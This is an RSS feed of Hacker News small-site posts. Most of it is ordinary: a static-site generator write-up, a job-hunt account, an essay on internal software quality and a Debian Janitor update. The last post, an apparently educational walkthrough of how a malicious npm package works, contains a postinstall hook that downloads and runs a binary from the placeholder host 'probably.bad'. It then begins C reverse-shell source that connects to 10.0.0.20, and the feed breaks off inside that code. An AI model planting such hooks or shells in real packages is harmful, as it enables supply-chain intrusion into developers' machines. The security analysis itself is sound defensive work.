days, I had a working MVP of my site in Routify.</p>
<p>Then disaster struck: I got a bunch of emails from Github. A series of high priority security vulnerabilities had been found in dependencies used by basically all of my web
projects. I spent a day force-updating all the dependencies of my web projects – a bit of a pain because npm refuses to natively upgrade breaking changes – and decided to stay
as far away from the Javascript ecosystem as possible. I hate that when I install a JS framework, a fundamental tool of modern web development, I install a million other
dependencies that could, and often do, have critical security vulnerabilities. I'm thankful that Dependabot caught these ones, but it really killed my enthusiasm for using any
JS framework on my site – which means Routify was out of the picture.</p>
<h2 id="the-last-dependency-standing">The Last Dependency Standing</h2>
<p>I decided to use a <a href="https://www.staticgen.com/">static site generator</a>. I'd heard of many of the big boys in the past, like <a href="https://gohugo.io/">Hugo</a>, <a href="https://jekyllrb.com/">Jekyll</a>, and <a href="https://www.11ty.dev/">Eleventy</a>, but they all had
their own problems when I looked at them in the past. Hugo has god-awful templating syntax, Jekyll is Ruby-based and I don't know Ruby, and Eleventy isn't even an escape from
Javascript! So I decided to use <a href="https://www.getzola.org/">Zola</a>, a "one-stop static site engine" with <strong>zero dependencies</strong>. Zola is made in Rust, so it's super fast, and it's designed to be dead
simple. Seriously: the CLI has only five commands, everything is configured from one <code>.toml</code> file, and your content is all written in "<a href="https://www.getzola.org/documentation/content/shortcodes/">Augmented</a>
<a href="https://www.getzola.org/documentation/content/linking/">Markdown</a>."</p>
<p>The interesting thing is that there's honestly not much more to the story because of how easy and simple Zola is to use. All of my posts and projects go into the <code>content</code>
directory, my CSS, favicon, and miscellaneous files (non-content related stuff like emojis and public keys) go in the <code>static</code> directory, and templates and shortcodes go into
the <code>templates</code> directory. If I was using a theme, it's files would go into a <code>theme</code> directory.</p>
<h3 id="benefits">Benefits</h3>
<ul>
<li>My slow Python script to convert Markdown posts to Svelte (which was perfect at first but I then packed full excess tests and sandboxing) is gone. Zola handles that
automatically.</li>
<li>I got rid of TailwindCSS, and replaced it with <a href="https://figbert.com/global.css">custom styles</a>. It's actually pretty fun to write simple custom CSS, especially with modern tools like variables.</li>
<li>Writing new posts is ludicrously easy now. I write a post in Markdown, throw any images or videos used <a href="https://www.getzola.org/documentation/content/overview/#asset-colocation">in the same directory</a>, and publish.</li>
<li>Zola comes with a whole bunch of features built-in that I didn't have before, like syntax highlighting and anchor links (the latter of which I have yet to set up). Other
things are just handled automatically, like feed generation or i18n.</li>
<li>Build times are much faster. Exporting with Sapper wasn't slow, but it didn't feel instant. Zola does.</li>
</ul>
<h3 id="drawbacks">Drawbacks</h3>
<ul>
<li>You sacrifice a certain amount of control by using a static site generator, like <a href="https://github.com/getzola/zola/issues/681">link</a> <a href="https://github.com/getzola/zola/issues/695">properties</a>. You could solve this with <a href="https://www.getzola.org/documentation/content/shortcodes/">shortcodes</a>,
or by contributing to the project (which I plan to do).</li>
<li>I mean that's really it to be honest.</li>
</ul>
<h2 id="to-infinity-and-beyond">To Infinity and Beyond</h2>
<p>I'm really happy with using Zola, and I look forward to continuing to work with it in the future. I want to publish my blog's styles and templates as a <a href="https://www.getzola.org/themes/">Zola theme</a>, but
I have to iron out a few kinks (like anchor links, which are still a bit finicky on my end) before that. I also have yet to re-implement a bunch of the indie-web features and
<a href="https://www.goatcounter.com/">GoatCounter</a> analytics of my old site into this version. Overall though, I think it's been a really fun and productive experiment using Zola, and I'd highly recommend using
it for anybody looking for a great, no-nonsense static site generator.</p>
<p>Until next time, FIGBERT.</p>
</div></div>]]>
            </description>
            <link>https://figbert.com/posts/going-full-static/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247815</guid>
            <pubDate>Sat, 22 Aug 2020 22:33:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Post About My New Job (and the Ones I Didn’t Get)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24247797">thread link</a>) | @luu
<br/>
August 22, 2020 | https://geekygirlsarah.com/2018/02/05/a-post-about-my-new-job-and-the-ones-i-didnt-get/ | <a href="https://web.archive.org/web/*/https://geekygirlsarah.com/2018/02/05/a-post-about-my-new-job-and-the-ones-i-didnt-get/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
            <p> 




  12 minute read
</p>
          
        </header>
      

      <section itemprop="text">
        
        <p>This post is a part of a series on job hunting and job interviewing.</p>

<p>I’m excited to say that after about 8 months of job hunting, I finally accepted a new software engineering job!</p>

<p>Before I tell you about it, I really want to talk about the jobs I <em>didn’t</em> get and the interview processes I went through.</p>

<p>(<a href="#tldr">tl;dr “just tell me about the new job already!”</a>)</p>

<h3 id="soooooo-many-interviews">Soooooo Many Interviews….</h3>

<p>I started slowly hunting for jobs about June last year. I knew that in the last few teams I was on the work was really kind of terrible, some of the people were really difficult, or both. I didn’t want to do this again. I didn’t want “yet another developer job” (as I called it) either . I really wanted something where I knew I would thrive, something I knew would be interesting and challenging, and somewhere I knew the team/department/company’s culture would be a lot better for me.</p>

<p>And of course to pull this off, I have to be a LOT more picky on the companies that I interviewed with. I also figured I was at a point where I could not only try going after some of the Big Name Tech Companies™. I also have a wide enough network that I decided I wanted to do it only through referrals. (Don’t worry… I’m working on a post on how to start networking if you hate networking so that you can also build up your own big network!)</p>

<p>I also decided that in addition to software engineering type roles, I wanted to look for developer advocacy (or developer evangelist) roles. I liked the idea of building things, but also working with other developers to help them with their products and to go around and speak about things I worked on. So I kept an open mind for both.</p>

<p>And I was pretty successful. I interviewed at many places, and not just that, but I got quite far in most of the interview processes. My network helped me get into nearly every company with a guaranteed interview, but after a while, sometimes the processes just took so long to get through it felt like I’d never hear if I got hired OR rejected. The waiting was probably the worst part.</p>

<p>I also decided after my current company (at the time) knew about my job hunt, I would share openly, but not talk about specific companies yet until I had accepted an offer.</p>

<h3 id="the-process-and-how-far-i-got">The Process and How Far I Got</h3>

<p>I am actually rather proud of myself. I talked to some pretty awesome companies:</p>

<ul>
  <li><a href="https://geekygirlsarah.com/wp-content/uploads/2018/02/jobinterviews.jpg"><img src="https://d33wubrfki0l68.cloudfront.net/fff27e9061085b31b55642a5234e1dc8275d5cd8/3dbf6/assets/images/2018/02/jobinterviews-277x300.jpg" alt="Pictures of me at Amazon, Google, New Relic, and Square" width="277" height="300"></a>Square: I was recommended for a senior developer position by a friend, and turns out I already knew her manager! After a recruiter call and two technical (code) phone calls, I felt pretty good. I got to go on-site in San Francisco. I got to the end, but they hired someone else. But for as obnoxious as it is to have done basically 12 interviews of some form or another (including 8 code interviews and 2 design interviews), I got every vibe this was a GREAT place to work! They passed my “<a href="https://geekygirlsarah.com/2017/11/20/the-three-questions-im-asking-at-every-interview/">3 questions test</a>” too, and I’d gladly work there if they asked me in the future.</li>
  <li>Microsoft: Microsoft seems daunting but I actually had a really good experience with them. I had a friend recommend a recruiter, so I reached out to her. It got me an interview in which she really liked me and it got my foot in the door. After that it became a matter of finding the right team. I interviewed on a couple of teams that didn’t really click, then interviews with their cloud developer advocate team. It was one of my top 3 interviews probably. No code, no quirky brain teasers, just my interviewer and I. And he loved me and aside from not having all the cloud experience they wanted, they probably would have hired me. They even dropped hints if I could learn the cloud things I needed, they’d reconsider. (I, unfortunately, couldn’t really find the spare time to do this with a full time job and job hunting too.)</li>
  <li>Amazon: Through <a href="https://twitter.com/hashtag/witbragday">#WITBragDay</a>, I met a woman on Twitter. We chatted and became friends rather quickly. I learned she was a recruiter and learned she was with the Amazon Fashions team. Intrigued, I asked her about it. It sounded like a cool developer spot (and she even addressed my concerns about Amazon’s bad work/life reputation). Did a phone chat, and then a team interview. The team said no, but they put me in for other teams to look at me. After two more teams who promised things and didn’t deliver (including an on-site), another team picked me up. I flew to Seattle, interviewed with them, but didn’t make the cut.</li>
  <li>Google: About once a year for several years some Google recruiter reached out to me for engineering roles. I declined them all until one reached out in the middle of this search. And I thought “I did Square, Microsoft, and Amazon, why not? I doubt I’ll make it far.”&nbsp; But after a recruiter call, a code challenge I flopped miserably, then a code challenge I absolutely rocked at, I got flown on-site. I didn’t make it, though to be fair, I wasn’t surprised. (On my flight home I did get my current job offer though!)</li>
  <li>New Relic: I had heard some questionable things about them, but seems that those things kind of went by the wayside. So another friend recommendation got me in to a senior developer role interview. After some discussions and a code sample I submitted, I was flown to Portland for an on-site. I had a lot of good conversations here. They were also very conscious about finding a good senior that would mentor their junior team member and so they interviewed for that. I was one of the top 3 candidates but lacked one of the buzzwords in my skillset to make it to the end. (This is another company that the culture seemed amazing, and I’d definitely go there if they asked again.)</li>
  <li>MongoDB: This was a developer advocate role a friend recommended me for. I rocked every step, and this was probably one of the most complex interviews I had, including ultimately about 9 phone calls. But one of them wasn’t impressed with me, gave me no real feedback on it, and it disqualified me entirely. (Bummer too, I almost had a free trip to New York City!)</li>
  <li>IBM: I got to meet Erin McKean rather randomly and accidentally at Strange Loop (I didn’t realize it was Erin until after I had chatted with her a couple of times.) She got me an interview on their San Francisco developer advocate team. I made it a few phone calls in before I was rejected because they said they changed their mind and wanted to hire for the role internally instead.</li>
  <li>StitchFix: Two friends recommended me here. I got a couple of interviews (including a super fun one that involved thinking through problems without code or computers). Despite rocking them, very weirdly I got a generic form template email rejecting me and I never heard feedback on why I was rejected.</li>
</ul>

<p>There were some others that the process wasn’t nearly as good:</p>

<ul>
  <li>Twilio: I heard about a developer advocate role. I had a friend recommend me, which ended up getting me both a rejection and an interview at the same time. (I still can’t explain the two emails, and apparently neither can anyone else.) After my one technical phone call, l got my template rejection email.</li>
  <li>JFrog: This was also another developer advocate role. The job description was <em>ridiculous</em> with its requirements (to the point I literally didn’t think they’d be able to find anyone). I was told to apply anyway. The chats were great, and I was (I believe) a top candidate. But they decided to change the role to be less “developery” and we mutually agreed to not move forward.</li>
  <li>MuleSoft: I got one technical call in and decided I probably wouldn’t like the culture. They didn’t move forward anyway.</li>
  <li>Akamai: I was recommended for an advocate position that wasn’t posted yet. Months later my contact told me it was posted but they didn’t recommend it anymore after some internal changes.</li>
  <li>VML: The one and only local company I considered, and only because it would have been a temporary contract with option to hire later (but maybe by then I could have moved out of the city) and would have paid really well. The managers loved me, got a verbal job offer, then talked to someone else and had the offer retracted. I’m not quite sure what happened there, but I’m accounting it partly to a recruiter that didn’t sell me well. I received no feedback either.</li>
  <li>Etsy: A friend recommended me for an engineering position only to have them do a hiring freeze, a company re-org, and a layoff. After assuring me things had settled down and it was still good, I went in. I went through a recruiter phone call and two code challenges before a rejection. Like several others, I had one code interview I got amazing feedback on, then one I got ridiculously terrible feedback on.</li>
  <li>The Document Foundation: A friend pointed out a software developer mentor position. It seemed interesting to be able to develop LibreOffice as well as mentor other people contributing to it. I was recommended and… delays. They got back to me, but unfortunately after I got hired. I would have gone through it had I not received my current offer.</li>
</ul>

<p>And there were some more, but the above ones were the more notable ones. It’s been quite the journey.</p>

<p>From all of these, I think I learned a few things from the interviews. One of the main things I learned was that I can judge a company pretty well if I ask the right questions to their employees. I also learned that strictly code-based interviews are probably the worst way to interview someone, especially if they’re whiteboard based with no computer resources. (There were some better code interviews, but they had a mix of pairing as well as other conversations too.) And the more I did strictly code-based interviews, the more I didn’t want to work at the company anymore.</p>

<p>Finally, I had a lot of rejections. It ended up helping to not think “They rejected me” but instead think “This company doesn’t fit what I’m looking for” or “This company doesn’t meet my needs.” Thinking in these terms helped me realize that really the process is not only for them to look at me, but me to look at them.<br>
<a name="tldr"></a></p>

<h3 id="so-sarah-where-did-you-end-up">So …</h3></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://geekygirlsarah.com/2018/02/05/a-post-about-my-new-job-and-the-ones-i-didnt-get/">https://geekygirlsarah.com/2018/02/05/a-post-about-my-new-job-and-the-ones-i-didnt-get/</a></em></p>]]>
            </description>
            <link>https://geekygirlsarah.com/2018/02/05/a-post-about-my-new-job-and-the-ones-i-didnt-get/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247797</guid>
            <pubDate>Sat, 22 Aug 2020 22:31:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On (Internal) Software Quality and “The Correlation Principle”]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24247783">thread link</a>) | @stanislavb
<br/>
August 22, 2020 | https://www.geepawhill.org/2020/08/21/the-correlation-principle/ | <a href="https://web.archive.org/web/*/https://www.geepawhill.org/2020/08/21/the-correlation-principle/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

		<div>

		

	<div id="primary">

		
					<main id="main">

				
					
					

<article id="post-6635" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		
<hr>
<h4>The correlation principle says that our productivity is tightly correlated with the internal quality of software.</h4>
<p>The two go up together, and they go down together, and you can’t trade away the one to get more of the other. Let’s talk it over.</p>
<p>I remind us that geekery isn’t the main story right now, though you and I can use it as comfort food.</p>
<blockquote>
<p>Keep working on changing the world. We can do this. In fact, we’re the only thing that can do this, so stay safe, strong, angry, and kind out there. Black lives matter.</p>
</blockquote>
<p>The basic idea of the correlation premise is actually pretty simple, but when we introduce it, we generally get a chorus of yabbits. ("Yeah, but…") There are several confusions common to most of that chorus, so let’s look at them one at a time.</p>
<p>Confusion: mixing up internal software quality and external software quality. The yabbit takes this form: "Yeah, but we can get it done faster if we settle for it working less well."</p>
<p>See, here’s the thing: that’s generally true. We <em>can</em> deliver more quickly by settling for a lower level of value.</p>
<p>The trick is to understand the yabbit as being about <em>external</em> software quality, not <em>internal</em> software quality.</p>
<p>External Software Quality, let’s call it ESQ, is any attribute of our application that a person can experience by using it. Internal Software Quality (ISQ), on the other hand, is any attribute you of our application that you can experience only by seeing the code.</p>
<p>You <em>can</em> trade ESQ for time-to-market. You can make the app slower, or uglier. You can make it do fewer things. You can make it handle fewer cases in the things it does do. All of this will, generally, get you to the market faster.</p>
<p>Well, can we trade ISQ away to get better delivery times, the way we often do with ESQ?</p>
<p>Just as the answer with ESQ is "generally, yes", the answer with ISQ is "generally, no".</p>
<p>It’s because lowering ESQ makes some things easier, but lowering ISQ makes all things harder.</p>
<p>Write down the gigantic production function that will predict how much value gets added by your team today. They’ll be dozens of complicated terms in the expression. Sort them from biggest to smallest, and what do you get? Three of those terms are "the big three", every time.</p>
<h5>From most significant to least, the big three terms in our daily production equation are 1) How inherently complex is the problem domain? 2) How good is the team? 3) How changeable is the code?</h5>
<p>Think about how you’d alter any of these three things.</p>
<p><em>Well, dangit.</em></p>
<p>You can change the problem domain, but such changes are usually paradigm shifts, with years in the making.</p>
<p>You can change the skill level of your team, but that’s not going to get you to market faster right now, it’s more like a capital investment.</p>
<p>But that third thing: "How changeable is the code?" See, that’s just ISQ by any other name.</p>
<p>The third largest term, the easiest one for us to change, is exactly what we mean by ISQ. And that’s why we can’t trade it away for more productivity. They’re directly correlated.</p>
<p>Changing code is the fundamental behavior of software development teams. If we reduce the changeability of the code, we reduce the team’s effectiveness. We get less value or we get value more slowly.</p>
<p>A brief aside: "value". People get distracted by obsessing over what value means in their application’s context. That’s good stuff, urgent stuff, but it’s not an important argument to have here: however you define value, if getting it depends on changing code, ISQ’s the 3rd term.</p>
<p>In particular, I leave it to the value-definers in my team or org to decide about how many bugs it’s okay to ship. Shipped bugs is ESQ. ISQ is about changeability.</p>
<p>Next confusion: The timescale of ISQ impact. The yabbit sounds like "Yeah, but, even granting that ISQ is correlated, the correlation isn’t instantaneous. There’s a window where we can cheat ISQ, get to market faster, and then go back and re-raise the ISQ."</p>
<p>This take has two flaws, one obvious as all hell to anyone who’s ever had a job in the trade, and one — more important — that’s hidden from the view of most non-developers. Let’s do the hidden one first.</p>
<p>The timescale for the impact of ISQ violations is ridiculously short, far shorter than the timescale at which the majority of your time-to-market calculations take place.</p>
<p>Take a weak variable name, for instance. How soon does that weak name’s effect on ISQ take place? Well. The only reason you give a variable a name at all is so you can use it. And you use it immediately. (In some styles of programming, you use it before you even define it.)</p>
<p>This holds true for most of the ISQ violations: weak naming, poor factoring, signal-hiding, testlessness, strong coupling, the list goes on and on. Every one of these starts taking effect immediately.</p>
<p>And their effect isn’t linear, either. One bad name won’t sink a ship. A hundred bad names will. And that’s one of the <em>smaller</em> violations. The big ones scale out of control even more quickly.</p>
<p>So the hidden flaw in the yabbit is that breaking ISQ has serious impact much more rapidly than non-developers think. (And, frankly, than noob developers think, too, and they dominate the mix at most orgs)</p>
<p>What about the obvious flaw? "We’ll fix the ISQ right after we ship."</p>
<blockquote>
<p><em>uhhh-HAHAHAHAHAAHAHA!</em> No we won’t.</p>
</blockquote>
<p>There are real reasons why, but you know what, I’m not even going to bother.</p>
<p><em>We won’t.</em></p>
<p>Next confusion: conflating ISQ with "clean", its cognates, its synonyms, and its overtones. The yabbit form is a bewildering variety of this shape: "Yeah, but, we don’t have time for you to wash the dishes, we gotta go now."</p>
<p>I am long on record as opposing the use of "clean" as a word to describe ISQ. Not only is it misleading about what ISQ activity looks like, it’s also misleading about the impact of low ISQ. (It’s also commonly used to suggest moral deficits on the part of people we want to beat.)</p>
<p>Maintaining my ISQ doesn’t look like cleaning. It’s not getting on a ladder to brush away cobwebs. It’s not doing the laundry. It’s not washing carefully behind my ears. It’s not emptying the kitchen sink of dirty dishes.</p>
<p>If it resembles anything in the physical world, it’s incrementally remodeling my space. Rerranging walls, putting shower &amp; toilet close together but not on top of each other, and so on. But even that’s a lousy metaphor, because it doesn’t mention <em>why</em>: for optimal performance.</p>
<p>See, my living space is used for lots and lots of different activities, so there isn’t really a single optimal layout. Optimality here is largely a matter of taste, not just in how you prioritize your particular set of activities, but in how you sort the dependencies within them.</p>
<p>But our codespace, unlike our apartment, is used for just one thing: changing code. And optimality for changing code — we call that ISQ — is much more well-defined, outside of taste, understood, and inter-subjectively confirmable.</p>
<blockquote>
<p>(Yes, there are still matters of taste. But far fewer of them, with far less variance. Having said that, let me remind you that the left-to-right ordering of arguments in a function definition is largest-scope to smalleset-scope, and Nayan is a doofus for arguing the reverse.)</p>
</blockquote>
<p>And what about impact? Look, sure, we lose some efficiency if we start with dirty dishes, or dirty laundry all over everything. But not much. We can still cook dinner, we can still get to work on time, without stopping to clean. We can. People do. All the time.</p>
<p>That’s because the cleanliness of your dishes or your room is simply not one of the largest terms determining your effectiveness as a cook or an employee. It’s just not.</p>
<p>But ISQ is the third largest term in my productivity equation. Trash my ISQ and <em>everything</em> I do is slower.</p>
<blockquote>
<p>(I’m not going to talk about the cleanliness-as-morality stick and shtick today. Look for older work if you want that. Suffice to say: Please stop equating software development efficiency with morality, especially in such a pre-adolescent manner.)</p>
</blockquote>
<p>Alright, those are three common confusions and yabbits around the correlation premise. Let’s quickly review the case we’re making, this time without all the yabbits.</p>
<p>We want more value faster. The value could be "more features", or "lower MTBF", or "smaller footprint" or "faster runtime" or "better UX" or "fewer bugs". The only fixed aspect of the value definition for the purposes of this case: to get it we have to change code.</p>
<p>Some code is more easily changed than other code. There are a lot of factors involved in this, but they mostly come down to whether it is arranged in such a fashion that humans can quickly grok its meaning.</p>
<p>We call all of the attributes of "easily changed" by another name: Internal Software Quality, or ISQ for short. That’s as opposed to External Software Quality (ESQ). The difference: any user can detect ESQ attributes, but only people with the codebase can detect ISQ attributes.</p>
<p>The correlation principle: Productivity and Internal Software Quality are directly &amp; strongly correlated. They go up together, and they go down together. You can’t trade away ISQ to get more productivity. You can reduce time-to-market by giving up ESQ, but not ISQ.</p>
<hr>
<h4>Supporting The PawCast</h4>
<p>If you love the GeePaw Podcast, consider a monthly donation to help keep the content flowing. <a href="https://anchor.fm/geepawhill/support" target="_blank" rel="noopener">Support GeePaw Here</a>. You can also participate by sending in voice messages to be included in the podcasts. These can be questions, comments, prompts, etc. [Submit A Voice Message Here</p>

		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article><!-- #post-## -->


<!-- #comments -->

					
					
				
			</main><!-- #main -->
			
		
	</div><!-- #primary -->


			
			</div> <!-- ast-container -->

		</div></div>]]>
            </description>
            <link>https://www.geepawhill.org/2020/08/21/the-correlation-principle/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247783</guid>
            <pubDate>Sat, 22 Aug 2020 22:29:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debian Janitor: 60k Lintian Issues Automatically Fixed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24247617">thread link</a>) | @jelmer
<br/>
August 22, 2020 | https://www.jelmer.uk/janitor-update-3.html | <a href="https://web.archive.org/web/*/https://www.jelmer.uk/janitor-update-3.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="layout">
    <div>
        <div>
            <section>
                
            </section>
            <p>The <a href="https://jelmer.uk/debian-janitor.html">Debian Janitor</a> is an automated
system that commits fixes for (minor) issues in Debian packages that can be
fixed by software. It gradually started proposing merges in early
December. The first set of changes sent out ran <a href="https://salsa.debian.org/jelmer/lintian-brush">lintian-brush</a> on sid packages maintained in
Git. This post is part of <a href="https://jelmer.uk/tag/janitor-update.html">a series</a> about the progress of the
Janitor.</p>
<div id="scheduling-lintian-fixes">
<h2>Scheduling Lintian Fixes</h2>
<p>To determine which packages to process, the  <a href="https://janitor.debian.net/">Janitor</a>  looks at the import of  <a href="https://lintian.debian.org/">lintian</a>  output across the archive that is available
in  <a href="https://wiki.debian.org/UltimateDebianDatabase/">UDD</a> <a href="#f1" id="id1">[1]</a>. It
will prioritize those packages with the most and more severe issues that it has
fixers for.</p>
<p>Once a package is selected, it will clone the packaging repository and run
<a href="https://manpages.debian.org/testing/lintian-brush/lintian-brush.1.en.html">lintian-brush</a>
on it.  Lintian-brush provides a framework for applying a set of “fixers” to a
package. It will run each of a set of “fixers” in a pristine version of the
repository, and handles most of the heavy lifting.</p>
</div>
<div id="the-inner-workings-of-a-fixer">
<h2>The Inner Workings of a Fixer</h2>
<p>Each fixer is just an executable which gets run in a clean
checkout of the package, and can make changes there. Most
of the fixers are written in Python or shell, but they
can be in any language.</p>
<p>The contract for fixers is pretty simple:</p>
<ul>
<li>If the fixer exits with non-zero, the changes are reverted and fixer is
considered to have failed</li>
<li>If exits with zero and made changes, then it should write a summary of its
changes to standard out</li>
</ul>
<p>If a fixer is uncertain about the changes it has made, it should report so on
standard output using a pseudo-header.  By default, lintian-brush will discard
any changes with uncertainty but if you are running it locally you can still
apply them by specifying <tt><span>--uncertain</span></tt>.</p>
<p>The summary message on standard out will be used for the commit message and
(possibly) the changelog message, if the package doesn’t use gbp dch.</p>
</div>
<div id="example-fixer">
<h2>Example Fixer</h2>
<p>Let’s look at an example. The package priority “extra” is deprecated since
Debian Policy 4.0.1 (released August 2 017) – see
<a href="https://www.debian.org/doc/debian-policy/ch-archive.html#priorities">Policy 2.5 "Priorities"</a>.
Instead, most packages should use the “optional” priority.</p>
<p>Lintian will warn when a package uses the deprecated “extra” value for the
“Priority”  - the associated tag is
<a href="https://lintian.debian.org/tags/priority-extra-is-replaced-by-priority-optional.html">priority-extra-is-replaced-by-priority-optional</a>.
Lintian-brush has a fixer script that can automatically replace “extra” with
“optional”.</p>
<p>On systems that have lintian-brush installed, the source for the fixer lives in
<a href="https://salsa.debian.org/jelmer/lintian-brush/-/blob/master/fixers/priority-extra-is-replaced-by-priority-optional.py">/usr/share/lintian-brush/fixers/priority-extra-is-replaced-by-priority-optional.py</a>,
but here is a copy of it for reference:</p>
<table><tbody><tr><td><div><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td><div><pre><span></span><span>#!/usr/bin/python3</span>

<span>from</span> <span>debmutate.control</span> <span>import</span> <span>ControlEditor</span>
<span>from</span> <span>lintian_brush.fixer</span> <span>import</span> <span>report_result</span><span>,</span> <span>fixed_lintian_tag</span>

<span>with</span> <span>ControlEditor</span><span>()</span> <span>as</span> <span>updater</span><span>:</span>
    <span>for</span> <span>para</span> <span>in</span> <span>updater</span><span>.</span><span>paragraphs</span><span>:</span>
        <span>if</span> <span>para</span><span>.</span><span>get</span><span>(</span><span>"Priority"</span><span>)</span> <span>==</span> <span>"extra"</span><span>:</span>
            <span>para</span><span>[</span><span>"Priority"</span><span>]</span> <span>=</span> <span>"optional"</span>
            <span>fixed_lintian_tag</span><span>(</span>
                <span>para</span><span>,</span> <span>'priority-extra-is-replaced-by-priority-optional'</span><span>)</span>

<span>report_result</span><span>(</span><span>"Change priority extra to priority optional."</span><span>)</span>
</pre></div>
</td></tr></tbody></table><p>This fixer is written in Python and uses the  <a href="https://salsa.debian.org/jelmer/debmutate">debmutate</a>  library to easily modify
control files while preserving formatting — or back out if it is not possible
to preserve formatting.</p>
<p>All the current fixers come with tests, e.g. for this particular fixer the
tests can be found here:
<a href="https://salsa.debian.org/jelmer/lintian-brush/-/tree/master/tests/priority-extra-is-replaced-by-priority-optional">https://salsa.debian.org/jelmer/lintian-brush/-/tree/master/tests/priority-extra-is-replaced-by-priority-optional</a>.</p>
<p>For more details on writing new fixers, see the  <a href="https://salsa.debian.org/jelmer/lintian-brush#writing-new-fixers">README</a>  for
lintian-brush.</p>
<p>For more details on debugging them, see the  <a href="https://manpages.debian.org/unstable/lintian-brush/lintian-brush.1.en.html">manual page</a>.</p>
</div>


            

            

            
            <p><a href="#">Go Top</a></p>        </div>
    </div>
</div></div>]]>
            </description>
            <link>https://www.jelmer.uk/janitor-update-3.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24247617</guid>
            <pubDate>Sat, 22 Aug 2020 22:01:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Anatomy of a Malicious NPM Package]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24247478">thread link</a>) | @oedmarap
<br/>
August 22, 2020 | https://blog.phylum.io/malicious-javascript-code-in-npm-malware/ | <a href="https://web.archive.org/web/*/https://blog.phylum.io/malicious-javascript-code-in-npm-malware/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>What does a malicious package actually look like in practice? We'll walk through some hypothetical exercises to see how malware generally works, and what sort of functions we might expect, from relatively simple and temporary, to complex. Additionally, as we are focused primarily on Javascript for this post, we really need to think about two different threat models: what does in-browser malware look like, and how is that going to differ from on-host malware? What are primary attack methods, what could an attacker feasibly accomplish with each level of access, and what has malware historically done in each context? To that end, we will actually split this into a series of articles: in the first (this post), we will begin to examine what "on-host" Javascript malware looks like, followed by a more in-depth look at what we can do to make our malware stealthier and more resistant to removal. Finally, in the last set of posts, we will delve into browser-based malware, and what we can accomplish within the browser sandbox.</p><h3 id="attacker-motivations-and-mentality">Attacker Motivations and Mentality</h3><p>As we begin this thought experiment, the first thing to consider is what a potential attacker's targets and goals would be. We'll focus on NPM specifically in this article, primarily because it gives a good survey of several platforms (in-browser vs on-system) with differing threat models, but the general process, methodologies, and concerns remain the same across other platforms, languages, and ecosystems.</p><h3 id="on-host">On-Host</h3><p>The whole concept of "on-host" malware in NPM packages seems a bit unintuitive at first blush, as the immediate association is generally with browser-focused concerns - which <em>must</em> be safe, since the run in the browser sandbox. In reality, however, on-host<a href="https://arxiv.org/abs/2005.09535"> is actually where most observed Javascript malware runs</a>. There are, interestingly enough, some serious advantages from an attacker's perspective in running there, rather than in an end user's web browser:</p><ul><li>If we run outside of a browser, we have the same level of access as the developer installing our package.</li><li>Running within a large, mainstream package in an end-user's browser increases our odds of being discovered - many more products and users are observing package behavior at the endpoint than during the build process.</li><li>To add to the last point, many security products actually ignore things like <code>devDependencies</code> entirely, and many of the infrastructure pieces, such as CI builders, where build-related code will run on has little-to-nothing in terms of security measures and mitigations.</li></ul><p>While this certainly doesn't mean we are <em>restricted</em> to operating on-host (as we'll see later, there is plenty we can do in-browser), this makes it a very compelling place to begin our journey. As such, we'll walk through an iterative process of making our badware package, and applying some gradual improvements.</p><h3 id="crawl">Crawl</h3><p>To start the project off, we'll build a simple npm package. What exactly it will do, or what value it will provide is largely irrelevant; for argument's sake, it might change the console font color, or include some pictures of cats, &nbsp;but in practice, it simply exists to bundle in our malware.</p><p>In order for our malware to be even moderately successful, we need three elements:</p><ol><li>To gain execution.</li><li>Network access.</li><li>To ensure the user remains unaware that we are running.</li></ol><p>To get what we might consider the most basic form of item one, we'll take a page from some prior work and leverage a great feature of our javascript tooling - the <code>postinstall</code> script. &nbsp;To that end, we'll start with our <code>package.json</code>:</p><pre><code>{
    "name": "mostly-harmless",
    "version": "1.0.0",
    /* ... */
    "scripts": {
        "postinstall": "wget https://probably.bad/malware &amp;&amp; chmod +x malware &amp;&amp; ./malware &amp;"
    }
}</code></pre><p>and (for now, at least) we won't make our malware too complex, perhaps we'll simply start with something like the following:</p><figure><pre><code>#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char** argv)
{
    struct sockaddr_in addr = {0};
	unsigned short     port = 1028;
	const char*        netaddr = "10.0.0.20";
	int                sock = -1;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	if(0 == inet_aton(netaddr, &amp;addr.sin_addr)) {
		return 0;
	}
    
	if(-1 == (sock = socket(AF_INET, SOCK_STREAM, 0))) {
		return 0;
	}

	if(connect(sock, (struct sockaddr*)&amp;addr, sizeof(addr))) {
		goto Cleanup;
	}
    
    if(-1 == dup2(sock, STDOUT_FILENO)) {
